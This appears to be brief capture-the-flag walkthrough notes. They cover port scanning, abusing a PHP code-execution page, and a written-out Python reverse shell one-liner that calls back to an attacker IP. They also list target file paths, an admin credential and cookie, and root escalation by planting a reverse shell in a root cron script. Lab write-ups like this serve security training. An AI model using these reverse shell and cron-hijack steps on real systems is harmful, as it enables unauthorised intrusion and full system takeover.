we scanned ports with nmap and there is a php code execution window on port 8002

from php_reverse_shell we get a nc reverse shell.

python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.17.17.11",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(bash)'

/var/www/serv1/
/var/www/html/topSecretPrivescMethod/secret.txt

first flag is in /var/www/serv4/index.php

"username":"admin","password":"admin","cookie":"1234bac1ea76920a79d435d0b74581b5"}

edit backup.sh(which is running as root in crontab) with python reverse shell code and nc listener (Use pwncat) to get root shell.